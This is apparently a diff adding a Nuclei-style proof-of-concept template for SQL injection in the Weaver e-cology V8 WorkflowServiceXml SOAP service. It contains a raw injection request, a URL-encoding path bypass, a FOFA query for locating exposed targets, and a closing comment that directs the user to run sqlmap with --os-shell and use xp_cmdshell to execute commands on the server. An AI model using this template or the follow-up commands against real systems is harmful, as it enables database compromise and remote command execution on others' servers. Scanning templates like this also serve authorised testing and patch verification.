@@ -1,0 +1,53 @@
+id: fanwei-ecology-v8-workflowservicexml-sqli
+info:
+  name: 泛微e-cology V8 WorkflowServiceXml SQL注入
+  author: yy
+  severity: high
+  description: SQL注入，DBA权限可直接--os-shell获取服务器权限
+  tags: fanwei,oa,ecology,sqli
+  metadata:
+    fofa-qeury: app="泛微-协同商务系统" && "ecology8"
+    veified: true
+    max-request: 1
+http:
+  - raw:
+    - |
+      POST {{paths}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/xml
+
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> 
+        <soapenv:Header/>
+        <soapenv:Body>
+          <web:getHendledWorkflowRequestList>
+            <web:in0>1</web:in0>
+            <web:in1>1</web:in1>
+            <web:in2>1</web:in2>
+            <web:in3>1</web:in3>
+            <web:in4>
+              <web:string>1=1 AND 5615=5615</web:string>
+            </web:in4>
+          </web:getHendledWorkflowRequestList>
+        </soapenv:Body>
+      </soapenv:Envelope>
+    
+    payloads:
+      paths:
+        - /services/WorkflowServiceXml
+        - /services%20/WorkflowServiceXml
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - 'lastOperatorName'
+          - 'lastOperateTime'
+          - 'receiveTime'
+        condition: and
+# Poc 跑出来之后执行sqlmap  python sqlmap.py -r 1.txt --random-agent --batch --os-shell（DBA权限可调用xp_cmdshell进行命令执行）
